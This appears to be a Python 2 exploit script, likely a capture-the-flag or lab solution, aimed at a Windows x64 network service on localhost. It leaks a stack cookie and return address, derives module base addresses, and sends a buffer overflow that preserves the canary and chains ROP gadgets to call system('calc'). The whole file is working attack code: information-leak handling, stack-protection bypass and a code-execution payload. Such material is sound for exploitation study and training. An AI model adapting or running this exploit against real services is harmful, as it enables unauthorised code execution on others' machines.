import socket
import struct
import time
import re

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)
u64 = lambda x: struct.unpack('<Q', x)[0]

from amnesia import *

def set_mem64(code, mem64, qword):
    rop = p64(code + 0x71) # 00007FF772811071 pop rbx # retn
    rop += p64(mem64) # --> rbx
    rop += p64(code + 0x10205) # 00007FF772821205 pop rax # retn
    rop += p64(qword) # --> rax
    rop += p64(code + 0x8600) # 00007FF772819600 mov [rbx], rax # add rsp, 20h # pop rbx # retn
    rop += 'Z' * 0x20 # --> add rsp, 20h
    rop += 'Z' * 8 # --> rbx
    
    return rop


def set_rdx(code, data, qword):
    mem64 = data + 0xF18 # 0x7FF77282EF18
    rop = set_mem64(code, mem64, qword) # mov [7FF77282EF18], data
    rop += p64(code + 0xE23) #00007FF772811E23 xchg rdx, cs:qword_7FF77282EF18 # add rsp, 20h # pop rbx # retn
    rop += 'Y' * 0x20 # --> add rsp, 20h
    rop += 'Y' * 8 # rop rbx
    
    return rop
    
def set_rcx(code, data, qword):
    rop = set_rdx(code, data, qword)
    
    rop += p64(code + 0x10205) # 00007FF772821205 pop rax # retn
    rop += p64(data+0x1000) # --> rax
    
    rop += p64(code + 0x19C8)# 00007FF7728129C8 mov rcx, [rdx] # mov [rax], rcx # retn
    
    return rop


print "[+]Connecting: localhost 8888..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 8888))
#s = amnesiaSocket('localhost', 8888)
s.send(struct.pack('<L', 0x41424344)+'D'*0x1000)


r = s.recv(1024).split('\n')[0]
m = re.search('([0-9]+)', r)
if not m:
    print '[!]port not found'
port = int(m.group(1))
print '[+]New port is: %d' % port
s.close()

print "[+]New connection: localhost %d\n" % port
time.sleep(0.5)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', port))
#s = amnesiaSocket('localhost', port)
r = s.recv(2048)

print "[+]Got memory leaks"
cookie_leak = r[0xCB:0xCB+8]
return_leak = u64(r[0xD3:0xD3+8])
print "Cookie leak : 0x%x" % u64(cookie_leak)
print "Return address leak: 0x%x" % return_leak

code = return_leak - 0x5D0
IAT = code + 0x13000
data = code + 0x1D000
print "code section @ 0x%x" % code
print "data section @ 0x%x" % data
print "IAT @ 0x%x" % IAT

system = code + 0x47C8
print "system function @ 0x%x\n" % system

print "[+]Sending the ropchain"
num1 = p32(0x4C2A1933)
num2 = p32(0x4C2A1934)
case = p32(0x1218) # count
xxx = 'xxx\0'
tmp = num1 + num2 + case + xxx

As = 'A'*(0x11F8 - len(tmp))
canary = cookie_leak
junk = 'B'*16

#control rip
szCalc = (data + 0x1000) + 0x10
rop = set_mem64(code, szCalc, 0x636c6163)#'calc'
pCalc = (data + 0x1000) + 0x20
rop += set_mem64(code, pCalc, szCalc)
rop += set_rcx(code, data, pCalc)# mov rcx, offset szCalc
rop += p64(system)


overflow = As +  canary + junk
case = p32(len(tmp+overflow+rop))
tmp = num1 + num2 + case + xxx

payload = tmp + overflow + rop

print "[+|]Executing the calc..."
s.send(payload)